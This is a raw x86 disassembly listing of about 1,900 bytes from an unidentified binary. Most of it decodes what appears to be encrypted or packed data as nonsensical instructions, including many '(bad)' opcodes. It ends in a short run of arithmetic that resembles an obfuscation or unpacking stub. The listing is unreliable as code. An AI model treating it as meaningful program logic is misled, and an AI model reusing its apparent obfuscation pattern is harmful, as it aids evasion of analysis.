  418875:	add    ah,BYTE PTR [ebp+eiz*1-0x662c57a]
  41887c:	push   eax
  41887d:	ins    DWORD PTR es:[edi],dx
  41887e:	sub    DWORD PTR [edx+0x10d4319f],edx
  418884:	test   al,0xc1
  418886:	sub    eax,0x1f14b8c7
  41888b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41888c:	or     al,0xbb
  41888e:	push   eax
  41888f:	enter  0x8422,0x11
  418893:	test   DWORD PTR [ebx+0x17],edx
  418896:	and    DWORD PTR [ebx+0x735449c2],esi
  41889c:	call   0xe4e124fa
  4188a1:	jg     0x418851
  4188a3:	sub    DWORD PTR ds:0x232406f5,edi
  4188a9:	or     bh,BYTE PTR [ecx+0x24]
  4188ac:	jl     0x418903
  4188ae:	push   ecx
  4188af:	adc    ebp,DWORD PTR [edi]
  4188b1:	(bad)  
  4188b2:	imul   esp,DWORD PTR [ebx+0x71f81504],0x2f
  4188b9:	or     al,BYTE PTR [edi+0x27]
  4188bc:	fadd   DWORD PTR [eax+esi*4]
  4188bf:	aad    0x9b
  4188c1:	jne    0x4188c6
  4188c3:	shl    ebp,0x66
  4188c6:	ss mov esp,0x136e2a19
  4188cc:	jge    0x4188ad
  4188ce:	shl    BYTE PTR [ebx+0xb],0x62
  4188d2:	loopne 0x41889c
  4188d4:	sub    BYTE PTR [eax+0x2d38b38b],al
  4188da:	cmp    ebx,ecx
  4188dc:	or     al,0xfb
  4188de:	and    DWORD PTR [edi+0x6f355fa],edx
  4188e4:	(bad)  
  4188e5:	scas   al,BYTE PTR es:[edi]
  4188e6:	adc    eax,0x174945c4
  4188eb:	sti    
  4188ec:	jbe    0x418918
  4188ee:	dec    ecx
  4188ef:	ds inc esi
  4188f1:	scas   al,BYTE PTR es:[edi]
  4188f2:	and    eax,0x4f57a9ea
  4188f7:	sbb    al,0x9
  4188f9:	xchg   edx,eax
  4188fa:	test   eax,0x3388d710
  4188ff:	fmul   DWORD PTR [edx+0x6c96f166]
  418905:	xchg   ebp,eax
  418906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418907:	cli    
  418908:	daa    
  418909:	ins    DWORD PTR es:[edi],dx
  41890a:	add    al,0xa0
  41890c:	cwde   
  41890d:	jne    0x4188a1
  41890f:	das    
  418910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418911:	(bad)  
  418912:	gs std 
  418914:	and    DWORD PTR [edi-0x6b3a069d],ecx
  41891a:	mov    al,ds:0x2243437e
  41891f:	sub    dh,dh
  418921:	xchg   esi,eax
  418922:	popf   
  418923:	dec    edi
  418924:	jecxz  0x4189a3
  418926:	dec    edi
  418927:	nop
  418928:	push   esp
  418929:	jb     0x41895a
  41892b:	fs mov edi,0x72f7557d
  418931:	xchg   edi,eax
  418932:	push   es
  418933:	mov    edi,0xc1f1704f
  418938:	dec    edi
  418939:	lea    esi,[ebp+0x30]
  41893c:	sub    al,0x84
  41893e:	sub    al,0x2f
  418940:	pop    ecx
  418941:	ror    BYTE PTR [edi+esi*2+0x69],1
  418945:	xchg   esi,eax
  418946:	xchg   ebp,eax
  418947:	dec    ebp
  418948:	icebp  
  418949:	jle    0x418950
  41894b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41894c:	inc    edi
  41894d:	aad    0x9e
  41894f:	setae  BYTE PTR [ebx-0x6e567562]
  418956:	jmp    0x4188f4
  418958:	or     al,0x0
  41895a:	call   0x4a8cf318
  41895f:	fmul   QWORD PTR [eax+0x58d95525]
  418965:	js     0x418903
  418967:	cmp    DWORD PTR [eax+ebp*8],edx
  41896a:	push   esi
  41896b:	test   DWORD PTR [edi+0xe],edi
  41896e:	pop    esp
  41896f:	retf   0xa865
  418972:	sub    DWORD PTR [edx],eax
  418974:	enter  0x47f8,0x6e
  418978:	xchg   ecx,eax
  418979:	xor    eax,DWORD PTR [edx+edx*4+0x3c]
  41897d:	inc    edx
  41897e:	and    edi,DWORD PTR [edi]
  418980:	das    
  418981:	popf   
  418982:	fld    TBYTE PTR [esp+ebx*4]
  418985:	add    cl,BYTE PTR [ebp-0x3d]
  418988:	lahf   
  418989:	push   0xffffff8b
  41898b:	xchg   BYTE PTR [edi],dh
  41898d:	cmc    
  41898e:	adc    eax,0x79129f74
  418993:	jo     0x41896d
  418995:	cs jns 0x418985
  418998:	icebp  
  418999:	pop    es
  41899a:	xor    eax,0x982ca051
  41899f:	inc    BYTE PTR [ebx-0x4af5f608]
  4189a5:	jl     0x41899d
  4189a7:	call   0x4451:0x72ec7985
  4189ae:	cdq    
  4189af:	(bad)  
  4189b1:	(bad)  
  4189b2:	sbb    DWORD PTR [ebp-0x3134c6b6],0xd28ee6da
  4189bc:	cmp    dl,BYTE PTR [ecx-0x7dd81f3a]
  4189c2:	scas   al,BYTE PTR es:[edi]
  4189c3:	mov    ebp,0xb332da9d
  4189c8:	sub    al,0x28
  4189ca:	push   edx
  4189cb:	adc    al,0x69
  4189cd:	int    0x90
  4189cf:	cmc    
  4189d0:	jbe    0x418a3e
  4189d2:	(bad)  
  4189d3:	mov    al,dh
  4189d5:	dec    eax
  4189d6:	lods   eax,DWORD PTR ds:[esi]
  4189d7:	mov    dl,0x27
  4189d9:	xchg   ecx,eax
  4189da:	icebp  
  4189db:	and    DWORD PTR [eax],ebx
  4189dd:	push   0x7e
  4189df:	adc    eax,0x67b2dd7
  4189e4:	xchg   edx,eax
  4189e5:	mov    al,ds:0xf20f5954
  4189ea:	inc    edi
  4189eb:	test   WORD PTR [edx-0x46],bp
  4189ef:	sbb    al,0xde
  4189f1:	cmp    al,0xa7
  4189f3:	xchg   ecx,eax
  4189f4:	jge    0x4189b4
  4189f6:	inc    eax
  4189f7:	fadd   QWORD PTR [ebx-0x45ce28e1]
  4189fd:	in     al,0xf
  4189ff:	mov    cl,0x1b
  418a01:	fnstsw WORD PTR [ebx-0x57d0f0da]
  418a07:	sbb    esp,ecx
  418a09:	stc    
  418a0a:	imul   ecx,DWORD PTR [edi],0xc26af079
  418a10:	out    dx,eax
  418a11:	std    
  418a12:	sub    eax,0x4925b96d
  418a17:	xor    ah,BYTE PTR [ebx+0x29]
  418a1a:	dec    esi
  418a1b:	aad    0x8f
  418a1d:	xor    ebp,0x3b9a3a8
  418a23:	mov    al,ds:0xcaef4737
  418a28:	sbb    BYTE PTR [eax+0x5f],ch
  418a2b:	mov    esp,0xf9817347
  418a30:	imul   esp,edx,0x4df7d0e6
  418a36:	shr    BYTE PTR [edi+0x1480fb86],0x8f
  418a3d:	retf   0xb58e
  418a40:	loope  0x418a93
  418a42:	mov    dh,0x63
  418a44:	clc    
  418a45:	push   cs
  418a46:	(bad)  
  418a47:	xor    al,0xf1
  418a49:	test   bh,cl
  418a4b:	xor    al,0xbf
  418a4d:	pop    ds
  418a4e:	imul   esi,DWORD PTR [eax],0x73
  418a51:	mov    esp,0xf1613982
  418a56:	pusha  
  418a57:	int3   
  418a58:	imul   esp,DWORD PTR [edx+ebx*2-0x4c6cee2c],0xae52068
  418a63:	ror    bh,1
  418a65:	add    ah,BYTE PTR [eax+0x62]
  418a68:	cmp    eax,0xb56b8b8b
  418a6d:	repz (bad) 
  418a6f:	lock push edx
  418a71:	fnstenv [esp+edi*2-0x6]
  418a75:	cmp    ebp,DWORD PTR [ebx]
  418a77:	xor    ah,ch
  418a79:	add    ch,BYTE PTR ds:0xbf9e198a
  418a7f:	add    DWORD PTR ds:0xd795d697,edi
  418a85:	gs pop edx
  418a87:	pop    edx
  418a88:	fnstsw WORD PTR [ebx+0x5b52a606]
  418a8e:	lods   eax,DWORD PTR fs:[esi]
  418a90:	ret    
  418a91:	call   0xadc5:0x215b05
  418a98:	xchg   ebx,eax
  418a99:	mov    ecx,0xe8ab64f8
  418a9e:	lds    ecx,FWORD PTR [ebx*1-0x3318c55f]
  418aa5:	push   cs
  418aa6:	cmp    esp,edx
  418aa8:	push   ecx
  418aa9:	pusha  
  418aaa:	push   edi
  418aab:	es pop ds
  418aad:	cmp    BYTE PTR [ebp-0x49],ah
  418ab0:	call   0xb4c8a235
  418ab5:	add    ebx,DWORD PTR [ebx-0x6f]
  418ab8:	stos   DWORD PTR es:[edi],eax
  418ab9:	lods   eax,DWORD PTR ds:[esi]
  418aba:	imul   ebx,DWORD PTR [bp+si-0x7a],0x23a7f2c3
  418ac2:	imul   eax,DWORD PTR [edx],0x71e2465d
  418ac8:	in     eax,0x2b
  418aca:	shl    DWORD PTR [eax+0x14],0x7
  418ace:	call   0xad47:0x31875031
  418ad5:	and    eax,0x1360aa60
  418ada:	and    BYTE PTR [eax-0x77f07e71],bh
  418ae0:	out    dx,al
  418ae1:	mov    eax,edi
  418ae3:	mov    bl,0x1d
  418ae5:	jmp    0x418a9b
  418ae7:	dec    ebx
  418ae8:	push   0xfd7e21ec
  418aed:	sbb    BYTE PTR [esi+edx*2],0x22
  418af1:	fcom   DWORD PTR [edi-0x10]
  418af4:	test   DWORD PTR [esi],ebp
  418af6:	retf   
  418af7:	jg     0x418b5b
  418af9:	daa    
  418afa:	xlat   BYTE PTR ds:[ebx]
  418afb:	inc    esp
  418afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418afd:	sbb    DWORD PTR [edx-0x2b4e3a3f],0x1421b454
  418b07:	in     eax,dx
  418b08:	pusha  
  418b09:	jg     0x418b45
  418b0b:	ins    BYTE PTR es:[edi],dx
  418b0c:	mov    ch,BYTE PTR [ecx-0x307a593c]
  418b12:	adc    edi,DWORD PTR [ebp-0x79]
  418b15:	fidiv  DWORD PTR [ecx-0x2578df6c]
  418b1b:	jg     0x418b79
  418b1d:	mov    ah,0xf3
  418b1f:	mov    DWORD PTR [esi-0x16],ebp
  418b22:	jg     0x418b87
  418b24:	scas   eax,DWORD PTR es:[edi]
  418b25:	and    al,0xe2
  418b27:	jb     0x418b8f
  418b29:	add    eax,0xc233b0db
  418b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2f:	loope  0x418b40
  418b31:	jo     0x418ac7
  418b33:	xchg   esp,eax
  418b34:	cmp    DWORD PTR [ebp-0x10d36631],ecx
  418b3a:	je     0x418b2a
  418b3c:	push   cs
  418b3d:	sti    
  418b3e:	mov    dh,al
  418b40:	push   esp
  418b41:	fadd   DWORD PTR [eax+0x10]
  418b44:	in     eax,dx
  418b45:	int    0xc9
  418b47:	hlt    
  418b48:	ins    DWORD PTR es:[edi],dx
  418b49:	(bad)  
  418b4a:	xlat   BYTE PTR ds:[ebx]
  418b4b:	mov    ebp,0x7db0a9ab
  418b50:	sti    
  418b51:	mov    edi,0xc30e64af
  418b56:	jl     0x418b19
  418b58:	mov    ebp,0xb082dee7
  418b5d:	mov    ah,0xe8
  418b5f:	and    eax,0xccb4e68a
  418b64:	fst    QWORD PTR [esi+0xf]
  418b67:	pop    ecx
  418b68:	pop    eax
  418b69:	xor    BYTE PTR [ebx],dh
  418b6b:	cmp    dh,cl
  418b6d:	cmp    eax,0xd0f57836
  418b72:	mov    ah,0x2b
  418b74:	cmc    
  418b75:	jp     0x418b1c
  418b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b78:	pop    ds
  418b79:	int    0x1a
  418b7b:	call   0x9d4da7a2
  418b80:	icebp  
  418b81:	sbb    ch,BYTE PTR [esi]
  418b83:	xchg   esp,eax
  418b84:	ins    DWORD PTR es:[edi],dx
  418b85:	xor    edx,DWORD PTR [edi-0xb]
  418b88:	jno    0x418bbb
  418b8a:	push   ecx
  418b8b:	aaa    
  418b8c:	xchg   ebp,eax
  418b8d:	test   DWORD PTR [ebp-0x4e],ebx
  418b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b91:	(bad)  
  418b92:	jae    0x418bbb
  418b94:	xlat   BYTE PTR ds:[ebx]
  418b95:	mov    bh,0xdd
  418b97:	popf   
  418b98:	and    al,0x6a
  418b9b:	mov    edi,0x50bc2670
  418ba0:	fcmovb st,st(2)
  418ba2:	xor    BYTE PTR [edi-0x5c],0x42
  418ba6:	(bad)  
  418ba7:	pop    edi
  418ba8:	adc    esi,DWORD PTR [edi+ebp*4]
  418bab:	jecxz  0x418b75
  418bad:	push   eax
  418bae:	ror    DWORD PTR [edx-0x13ad669e],1
  418bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bb5:	add    sp,WORD PTR ss:[edi+0x13]
  418bba:	sbb    BYTE PTR [edx-0x3a],dl
  418bbd:	inc    ebx
  418bbe:	and    eax,0x4c5affcc
  418bc3:	inc    ebp
  418bc4:	add    ebx,DWORD PTR [eax-0x14]
  418bc7:	inc    ebp
  418bc8:	sub    eax,0x8bca43e4
  418bcd:	out    0x92,al
  418bcf:	loope  0x418bcf
  418bd1:	mov    esi,0xfc3e5a2e
  418bd6:	and    eax,0x654d8d95
  418bdb:	shr    DWORD PTR [esi-0x28],cl
  418bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bdf:	outs   dx,BYTE PTR ds:[esi]
  418be0:	mov    ds:0x5715ac4a,eax
  418be5:	push   ds
  418be6:	and    BYTE PTR [ebp+0x7b5af987],al
  418bec:	xlat   BYTE PTR ds:[ebx]
  418bed:	into   
  418bee:	in     al,dx
  418bef:	and    BYTE PTR [ecx+edi*1+0x50e39f53],ch
  418bf6:	pushf  
  418bf7:	dec    ebp
  418bf8:	imul   ebp,DWORD PTR [edx-0x7b],0xfebeb697
  418bff:	(bad)  
  418c00:	hlt    
  418c01:	or     DWORD PTR [esi+esi*1],ecx
  418c04:	inc    edx
  418c05:	jns    0x418ba5
  418c07:	xchg   esp,eax
  418c08:	lahf   
  418c09:	xchg   edi,eax
  418c0a:	sub    al,0x44
  418c0c:	pusha  
  418c0d:	add    ebx,0x56
  418c10:	aad    0x95
  418c12:	retf   0x9f07
  418c15:	mov    ax,ds:0x3d00718e
  418c1b:	xchg   ebp,eax
  418c1c:	leave  
  418c1d:	push   0x569e7867
  418c22:	sub    al,0x3f
  418c24:	pop    edi
  418c25:	cld    
  418c26:	push   edx
  418c27:	ret    0x401a
  418c2a:	test   al,0x98
  418c2c:	shr    DWORD PTR [ecx+ecx*8],cl
  418c2f:	cdq    
  418c30:	mov    ds:0xec8b4ba4,eax
  418c35:	les    edi,FWORD PTR [ecx]
  418c37:	mov    edx,0x26c6bb0a
  418c3c:	push   ss
  418c3d:	adc    DWORD PTR [ebp-0x75],ebx
  418c40:	xor    al,0x8b
  418c42:	adc    eax,0x1b0f07a9
  418c47:	or     BYTE PTR [ecx],bl
  418c49:	inc    ebx
  418c4a:	mov    ebp,0x1d722b7e
  418c4f:	lods   al,BYTE PTR ds:[esi]
  418c50:	call   0x64660585
  418c55:	aaa    
  418c56:	xor    BYTE PTR [ecx],bl
  418c58:	cdq    
  418c59:	mov    ecx,0xee2765bf
  418c5e:	ds pop edi
  418c60:	dec    ebx
  418c61:	jmp    0x7ed2:0x613bb39e
  418c68:	(bad)  
  418c69:	xor    DWORD PTR [ecx-0x61171ed2],edi
  418c6f:	call   0x933e3a80
  418c74:	loop   0x418c6d
  418c76:	mov    bl,0xb4
  418c78:	add    eax,0x634dd011
  418c7d:	les    ebx,FWORD PTR [ebx+0x7b28440c]
  418c83:	mov    BYTE PTR [eax+0x16fe2e75],bl
  418c89:	xchg   ecx,eax
  418c8a:	and    BYTE PTR [ebx],dh
  418c8c:	out    dx,al
  418c8d:	pop    es
  418c8e:	adc    BYTE PTR [edx+0x3c88d473],cl
  418c94:	push   edx
  418c95:	aaa    
  418c96:	sar    BYTE PTR [eax+esi*1+0x5bb1c5],cl
  418c9d:	push   esi
  418c9e:	nop
  418c9f:	lods   al,BYTE PTR ds:[esi]
  418ca0:	fsubr  QWORD PTR [ecx-0x7ddcaca4]
  418ca6:	mov    esp,0x4aa04aa9
  418cab:	push   esp
  418cac:	jb     0x418cfc
  418cae:	test   al,0xae
  418cb0:	and    bl,BYTE PTR [ebp+0x5]
  418cb3:	leave  
  418cb4:	or     BYTE PTR [ebx],0x1f
  418cb7:	es hlt 
  418cb9:	(bad)  
  418cba:	xchg   esi,eax
  418cbb:	add    al,0xf7
  418cbd:	mov    ebx,DWORD PTR [ebp+0xb]
  418cc0:	in     eax,0x43
  418cc2:	(bad)  
  418cc3:	loopne 0x418d05
  418cc5:	push   edi
  418cc6:	and    DWORD PTR [ebp-0x25],ebx
  418cc9:	test   al,0x39
  418ccb:	(bad)  
  418ccc:	adc    edx,DWORD PTR [edx]
  418cce:	arpl   WORD PTR [ebp-0x324b6d6a],bp
  418cd4:	sbb    eax,0xfa1cfa68
  418cd9:	retf   0xe0c2
  418cdc:	lock pop esi
  418cde:	test   al,0xf5
  418ce0:	idiv   BYTE PTR ds:0xa364d9df
  418ce6:	xchg   BYTE PTR [ebx-0x67bb8a07],dl
  418cec:	xor    esi,esi
  418cee:	mov    ch,0x11
  418cf0:	push   ss
  418cf1:	lods   eax,DWORD PTR ds:[esi]
  418cf2:	or     al,0x4e
  418cf4:	rcr    DWORD PTR [esi],0x8d
  418cf7:	mov    ebp,0x33f13527
  418cfc:	nop
  418cfd:	sbb    edx,DWORD PTR [ecx+0x73]
  418d00:	les    edi,FWORD PTR [edx+0x50d084e3]
  418d06:	into   
  418d07:	inc    esp
  418d08:	and    al,0x78
  418d0a:	mov    bh,0x74
  418d0c:	mov    ebp,0xae51c59a
  418d11:	shl    BYTE PTR [eax-0x5b25ab27],0xd0
  418d18:	jbe    0x418d3a
  418d1a:	xor    esi,DWORD PTR [ecx+edi*1]
  418d1d:	scas   al,BYTE PTR es:[edi]
  418d1e:	ins    BYTE PTR es:[edi],dx
  418d1f:	in     al,0x63
  418d21:	xor    eax,ebp
  418d23:	rcl    DWORD PTR [ecx+0x5],1
  418d26:	mov    eax,DWORD PTR [ecx+eax*2]
  418d29:	pop    esp
  418d2a:	imul   edi,DWORD PTR [eax+eax*8-0x75],0x1b
  418d2f:	fstp   DWORD PTR [ebx-0x2a523167]
  418d35:	shl    DWORD PTR ds:0x80b7ebc4,0x15
  418d3c:	bound  ecx,QWORD PTR [edx+0x1fda3fa5]
  418d42:	int    0xfe
  418d44:	sbb    eax,0xca86bbc1
  418d49:	jl     0x418cd3
  418d4b:	or     eax,edi
  418d4d:	je     0x418d30
  418d4f:	mov    edi,0xa500ead0
  418d54:	push   ebp
  418d55:	jns    0x418cf0
  418d57:	in     al,0x80
  418d59:	sub    ecx,ebx
  418d5b:	les    eax,FWORD PTR [ebp+esi*8+0x25382a11]
  418d62:	adc    DWORD PTR [edi+0x3c],eax
  418d65:	inc    esp
  418d66:	mov    esi,0xb373a965
  418d6b:	xor    edi,DWORD PTR [edi]
  418d6d:	mov    esi,0xa338c9ef
  418d72:	fcomp  QWORD PTR ds:0x890a4e4c
  418d78:	fdivr  QWORD PTR [edi+0x275a7d68]
  418d7e:	mov    ds:0x120e9fb3,al
  418d83:	mov    WORD PTR [eax+0x1d645f6e],?
  418d89:	int    0x89
  418d8b:	rcl    BYTE PTR [esi],cl
  418d8d:	push   0xffffffda
  418d8f:	enter  0x7111,0xcd
  418d93:	pop    es
  418d94:	test   eax,0x153ba8da
  418d99:	call   0x36182e6f
  418d9e:	sub    dl,BYTE PTR [edi-0x15]
  418da1:	sub    ecx,DWORD PTR [esp+ebx*1]
  418da4:	xchg   edi,eax
  418da5:	xlat   BYTE PTR ds:[ebx]
  418da6:	mov    edx,0x9a4ad5f4
  418dab:	push   ecx
  418dac:	mov    ah,0x19
  418dae:	cld    
  418daf:	lahf   
  418db0:	sub    DWORD PTR [ebx-0x4659778f],esi
  418db6:	loopne 0x418dfb
  418db8:	fidivr WORD PTR [ecx+edi*8+0x6f85ee62]
  418dbf:	sub    cl,BYTE PTR [eax+esi*1+0x101c1520]
  418dc6:	xchg   ebx,eax
  418dc7:	stc    
  418dc8:	test   eax,0x7c56ae22
  418dcd:	push   ss
  418dce:	ret    0xd9fa
  418dd1:	mov    eax,0x76cf369
  418dd6:	stos   BYTE PTR es:[edi],al
  418dd7:	jl     0x418dea
  418dd9:	xchg   ecx,eax
  418dda:	stc    
  418ddb:	fld    TBYTE PTR [edi]
  418ddd:	add    BYTE PTR [ebx-0x69],ch
  418de0:	leave  
  418de1:	arpl   WORD PTR [eax+0x23],cx
  418de4:	mov    ebx,0x2deddcd9
  418de9:	les    ebp,FWORD PTR [ecx+0x61efd956]
  418def:	ret    
  418df0:	enter  0x2b1b,0xd7
  418df4:	(bad)  
  418df5:	gs ins DWORD PTR es:[edi],dx
  418df7:	rcr    DWORD PTR [esi],cl
  418df9:	cmp    ch,BYTE PTR ds:0x3362c70d
  418dff:	cwde   
  418e00:	mov    al,ds:0x5dee3199
  418e05:	mov    ch,BYTE PTR [ebp-0x70787b3]
  418e0b:	and    al,0x60
  418e0d:	stos   BYTE PTR es:[edi],al
  418e0e:	add    ecx,eax
  418e10:	sub    esi,ebx
  418e12:	cmp    al,BYTE PTR [ebx+0x8]
  418e15:	nop
  418e16:	ror    DWORD PTR [ecx+0x60522fe5],cl
  418e1c:	xlat   BYTE PTR ds:[ebx]
  418e1d:	arpl   WORD PTR [ebx],cx
  418e1f:	jmp    0x28d81023
  418e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e25:	shl    BYTE PTR [eax-0x2817a5b5],cl
  418e2b:	push   edi
  418e2c:	shl    esp,cl
  418e2e:	sbb    eax,0x451b3209
  418e33:	and    ch,BYTE PTR [eax+0x376c5e79]
  418e39:	add    al,0xf3
  418e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3c:	push   eax
  418e3d:	xor    al,0x52
  418e3f:	mov    bh,0x45
  418e41:	mov    dl,0x8d
  418e43:	enter  0xfd74,0x60
  418e47:	les    ecx,FWORD PTR [eax+0x6f]
  418e4a:	pcmpeqw mm6,mm6
  418e4d:	jne    0x418dcf
  418e4f:	inc    eax
  418e50:	cmp    DWORD PTR [edx-0x294a387],esp
  418e56:	popa   
  418e57:	push   cs
  418e58:	pop    ss
  418e59:	cdq    
  418e5a:	scas   eax,DWORD PTR es:[edi]
  418e5b:	cmp    al,0x4b
  418e5d:	(bad)  
  418e5e:	mov    eax,0xb27869ee
  418e63:	push   edi
  418e64:	or     al,0xd2
  418e66:	ss popf 
  418e68:	or     eax,0x6578971a
  418e6d:	sub    DWORD PTR [esi],0x9e9f52f2
  418e73:	sbb    eax,DWORD PTR [ebp+0x73f96ce2]
  418e79:	add    BYTE PTR [ecx-0x4f],0x51
  418e7d:	rol    bl,1
  418e7f:	adc    dl,ah
  418e81:	in     al,0xc
  418e83:	pushf  
  418e84:	jge    0x418e8b
  418e86:	pop    ecx
  418e87:	mov    al,ds:0x64525bfd
  418e8c:	or     ch,BYTE PTR [edi]
  418e8e:	or     edx,edi
  418e90:	and    al,0xc5
  418e92:	xor    edx,edi
  418e94:	push   ss
  418e95:	adc    al,0x1a
  418e97:	enter  0xf928,0x52
  418e9b:	scas   al,BYTE PTR es:[edi]
  418e9c:	mov    esi,0xc8912c81
  418ea1:	mov    al,ds:0xc9df9aad
  418ea6:	mov    al,0x3b
  418ea8:	cmp    dh,0x5d
  418eab:	sbb    al,0xa7
  418ead:	rol    ebx,1
  418eaf:	mov    BYTE PTR [edx-0x40],dh
  418eb2:	adc    DWORD PTR [ecx],ecx
  418eb4:	lods   al,BYTE PTR ds:[esi]
  418eb5:	pushf  
  418eb6:	pop    esi
  418eb7:	pop    esp
  418eb8:	jmp    0x418f31
  418eba:	repz ss retf 0x12f9
  418ebf:	cs dec esi
  418ec1:	pop    edi
  418ec2:	or     dh,BYTE PTR ds:0x562ddbb7
  418ec8:	test   eax,0x188db43d
  418ecd:	ins    DWORD PTR es:[edi],dx
  418ece:	lahf   
  418ecf:	fisubr WORD PTR [ebp-0x58]
  418ed2:	mov    bl,0xcd
  418ed4:	add    eax,0xde61891a
  418ed9:	addr16 jns 0x418ef3
  418edc:	sub    BYTE PTR [esi],dh
  418ede:	loop   0x418f41
  418ee0:	pusha  
  418ee1:	adc    ecx,DWORD PTR [ebx-0x1f]
  418ee4:	ins    DWORD PTR es:[edi],dx
  418ee5:	xchg   ecx,eax
  418ee6:	clc    
  418ee7:	sub    eax,0x51be0351
  418eec:	or     DWORD PTR [edi+0x54f415a],ebp
  418ef2:	call   0x62499f21
  418ef7:	psllw  mm1,QWORD PTR [edi+0x43]
  418efb:	test   BYTE PTR [edi-0xa],bh
  418efe:	cmp    eax,0xc6beb31c
  418f03:	imul   ebx,edi,0xffffff80
  418f06:	cld    
  418f07:	mov    esp,0xe06473a8
  418f0c:	clc    
  418f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f0e:	mov    DWORD PTR [edx+0x5f872bb9],ebx
  418f14:	mov    WORD PTR [eax+0x65],ds
  418f17:	mov    esp,0xbfeb7ab4
  418f1c:	pop    edx
  418f1d:	pop    edx
  418f1e:	stos   BYTE PTR es:[edi],al
  418f1f:	loop   0x418f16
  418f21:	mov    edx,0x81af5a7e
  418f26:	loop   0x418eaf
  418f28:	ja     0x418f9c
  418f2a:	mov    cl,0x7d
  418f2c:	dec    edx
  418f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f2e:	int    0xa9
  418f30:	(bad)  
  418f31:	int    0x55
  418f33:	push   0xffffffb0
  418f35:	int3   
  418f36:	and    DWORD PTR [ebp+0x75],ecx
  418f39:	(bad)  
  418f3a:	std    
  418f3b:	mov    ds:0x97730d5b,al
  418f40:	stos   BYTE PTR es:[edi],al
  418f41:	stos   BYTE PTR es:[edi],al
  418f42:	pop    ss
  418f43:	sti    
  418f44:	cmp    edx,ecx
  418f46:	or     bl,BYTE PTR [esi]
  418f48:	push   ss
  418f49:	fs scas al,BYTE PTR es:[edi]
  418f4b:	fwait
  418f4c:	out    dx,eax
  418f4d:	jo     0x418fa0
  418f4f:	int    0xea
  418f51:	aam    0x76
  418f53:	int    0xaa
  418f55:	stos   BYTE PTR es:[edi],al
  418f56:	mov    esi,0xfca170d3
  418f5b:	cld    
  418f5c:	ret    0x1601
  418f5f:	(bad)  
  418f60:	int    0xbc
  418f62:	cmp    DWORD PTR [esi-0x235f195f],esp
  418f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f69:	sbb    cl,ch
  418f6b:	pop    ds
  418f6c:	retf   
  418f6d:	adc    eax,0x2989cbb0
  418f72:	inc    edx
  418f73:	aad    0xfb
  418f75:	fwait
  418f76:	shr    BYTE PTR [eax-0x6],cl
  418f79:	mov    edi,0x82c19c27
  418f7e:	xchg   ebx,eax
  418f7f:	push   cs
  418f80:	mov    ah,0xf1
  418f82:	dec    esp
  418f83:	adc    ecx,DWORD PTR [eax*2-0x813533c]
  418f8a:	div    DWORD PTR [edi]
  418f8c:	in     eax,dx
  418f8d:	call   0xcd981619
  418f92:	jae    0x418f4d
  418f94:	imul   ecx,DWORD PTR [edx],0xffffffb9
  418f97:	sub    eax,0x5a3fb96f
  418f9c:	test   eax,0x18d736c9
  418fa1:	pop    edi
  418fa2:	mov    esp,0x9c14b00a
  418fa7:	int3   
  418fa8:	test   eax,0x66650299
  418fad:	loop   0x418fc3
  418faf:	xor    ch,BYTE PTR [ebx-0x742afc52]
  418fb5:	dec    eax
  418fb6:	or     DWORD PTR [eax],ebp
  418fb8:	mov    ebp,0xd32bd833
  418fbd:	sub    edx,esi
  418fbf:	xor    edx,eax
  418fc1:	mov    DWORD PTR [ebp+0x8],edx
  418fc4:	mov    edx,DWORD PTR [ebp+0x8]
  418fc7:	mov    ebx,DWORD PTR [ebp-0x58]
  418fca:	add    edx,0x5708fa
  418fd0:	imul   edx,ebx
  418fd3:	mov    DWORD PTR [ebp-0x58],edx
  418fd6:	mov    edx,DWORD PTR [ebp+0x8]
  418fd9:	mov    ebx,DWORD PTR [ebp-0x54]
  418fdc:	add    edx,0x64f898
  418fe2:	or     edx,ebx
  418fe4:	mov    DWORD PTR [ebp-0x54],edx
  418fe7:	mov    edx,DWORD PTR [ebp+0x8]
  418fea:	mov    ebx,DWORD PTR [ebp-0x50]
  418fed:	add    edx,ecx
  418fef:	xor    edx,ebx
  418ff1:	mov    DWORD PTR [ebp-0x50],edx
  418ff4:	mov    edx,DWORD PTR [ebp+0x8]
  418ff7:	mov    ebx,DWORD PTR [ebp-0x4c]
  418ffa:	add    edx,edi
  418ffc:	and    edx,ebx
  418ffe:	mov    DWORD PTR [ebp-0x4c],edx
  419001:	mov    edx,DWORD PTR [ebp+0x8]
  419004:	mov    ebx,DWORD PTR [ebp-0x48]
  419007:	lea    edx,[ebx+edx*1+0x241fcdf]
  41900e:	mov    DWORD PTR [ebp-0x48],edx
  419011:	mov    edx,DWORD PTR [ebp+0x8]
  419014:	mov    ebx,0xfa5e1524
  419019:	sub    ebx,edx
  41901b:	add    ebx,DWORD PTR [ebp-0x44]
  41901e:	mov    DWORD PTR [ebp-0x44],ebx
  419021:	mov    edx,DWORD PTR [ebp+0x8]
  419024:	xor    edx,eax
  419026:	add    edx,esi
  419028:	jne    0x416c52
  41902e:	jmp    0x4190bb
  419033:	mov    edx,DWORD PTR [ebp-0x14]
  419036:	mov    DWORD PTR [ebp+0x8],edx
  419039:	jmp    0x4190ae
  41903e:	mov    edx,DWORD PTR [ebp+0x8]
  419041:	mov    ebx,DWORD PTR [ebp-0x8]
  419044:	xor    edx,eax
  419046:	xor    ebx,eax
  419048:	sub    edx,ebx
  41904a:	sub    edx,esi
  41904c:	xor    edx,eax
  41904e:	mov    DWORD PTR [ebp+0x8],edx
  419051:	mov    edx,DWORD PTR [ebp+0x8]
  419054:	mov    ebx,DWORD PTR [ebp-0x58]
  419057:	add    edx,0x5708fa
  41905d:	imul   edx,ebx
